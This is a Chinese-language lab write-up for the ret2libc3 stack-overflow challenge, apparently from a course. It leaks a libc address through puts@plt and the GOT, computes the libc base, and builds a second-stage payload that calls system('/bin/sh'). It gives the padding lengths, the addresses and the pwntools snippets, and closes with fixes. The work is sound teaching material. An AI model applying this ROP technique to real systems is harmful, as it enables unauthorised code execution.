# ret2libc3 复现记录

本记录复现课程表格中的 `ret2libc3`：先泄露 libc 函数地址，计算 libc 基址，再调用 libc 中的 `system("/bin/sh")`。

配套程序：

```text
/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc3/ret2libc3
```

这是一个本地教学二进制，只用于理解栈溢出、GOT 泄露和 ret2libc。

## 1. 为什么需要泄露

这个版本没有可直接使用的 `system` 和 `/bin/sh` 固定地址。程序通过动态链接使用 libc，且 ASLR 会随机化 libc 的加载基址，因此必须先泄露一个 libc 函数的实际地址。

程序仍然存在：

```c
char buf1[100];
gets(buf1);
```

因此可以用第一阶段 ROP 调用程序已有的 `puts@plt`，打印 `__libc_start_main@got` 中保存的真实地址；随后返回 `main`，再次触发 `gets` 接收第二阶段 payload。

## 2. 防护检查

```bash
cd /home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc3
chmod +x ret2libc3
file ret2libc3
checksec --file=ret2libc3
```

关键结果：

```text
ELF 32-bit LSB executable, Intel 80386
No canary found
NX enabled
No PIE (0x8048000)
Partial RELRO
```

关键地址（程序本身的固定地址）：

| 作用 | 地址 |
| --- | --- |
| `puts@plt` | 由 ELF 的 PLT 表读取，当前为 `0x08048460` |
| `__libc_start_main@got` | 当前为 `0x0804a084` |
| `main` | `0x08048618` |
| 第一次 `gets` 目标 | `esp + 0x1c` |

复核命令：

```bash
python3 - <<'PY'
from pwn import *
e = ELF('./ret2libc3', checksec=False)
print('puts@plt =', hex(e.plt['puts']))
print('__libc_start_main@got =', hex(e.got['__libc_start_main']))
print('main =', hex(e.symbols['main']))
PY
```

## 3. libc 基址计算

本机运行一次时，第一阶段泄露出的地址类似：

```text
__libc_start_main = 0xf7d85de0
```

本机实际加载的 `/lib32/libc.so.6` 中：

```text
__libc_start_main offset = 0x1ade0
system offset             = 0x41360
"/bin/sh" offset          = 0x18c363
```

因此：

```text
libc_base = leaked_start_main - 0x1ade0
system    = libc_base + 0x41360
binsh     = libc_base + 0x18c363
```

脚本运行时动态读取这些符号，不使用固定的 ASLR 地址。

题目目录中还带有一份旧版 `libc.so`。它的符号偏移与当前系统 libc 不同；本复现脚本默认使用程序在当前机器实际加载的 `/lib32/libc.so.6`，因此泄露地址和计算结果保持一致。

## 4. 第一阶段：泄露地址

第一次返回地址覆盖为：

```text
112 字节填充
puts@plt
main
__libc_start_main@got
```

执行过程：

1. `main` 返回到 `puts@plt`。
2. `puts` 把 GOT 表中 `__libc_start_main` 的真实地址输出出来。
3. `puts` 返回到 `main`，程序再次打印提示并执行 `gets`。

用 cyclic pattern 测试第一阶段时，EIP 为 `0x62616164`：

```bash
python3 - <<'PY'
from pwn import *
print(cyclic_find(0x62616164, n=4))
PY
```

结果是 `112`。

## 5. 第二阶段：调用 system

第二次进入 `main` 后，栈对齐状态发生变化。对第二次 `gets` 重新用 cyclic pattern 测量，EIP 为 `0x62616162`：

```bash
python3 - <<'PY'
from pwn import *
print(cyclic_find(0x62616162, n=4))
PY
```

结果是 `104`。

第二阶段的 32 位 cdecl 栈布局：

```text
104 字节填充
system 地址
0x42424242                system 的返回地址，占位
libc_base + str_bin_sh    system 的参数
```

## 6. 复现步骤

```bash
cd /home/xyx/Desktop/ret2libc3_repro
python3 exploit.py
```

进入交互 shell 后输入：

```text
echo RET2LIBC3_OK
```

成功输出：

```text
RET2LIBC3_OK
```

一次成功运行会打印类似信息：

```text
leaked __libc_start_main = 0xf7d85de0
libc base = 0xf7d6b000
system = 0xf7dac360
/bin/sh = 0xf7ef7363
RET2LIBC3_OK
```

每次运行的绝对地址可能不同，这是 ASLR 的正常表现；偏移和计算关系不变。

## 7. 修复建议

漏洞根源是 `gets` 的无界写入。应改用带长度限制的 `fgets`，并启用栈 canary、PIE、完整 RELRO 和 NX。完整 RELRO 可以进一步保护 GOT，减少这类地址泄露和重定位表攻击面。
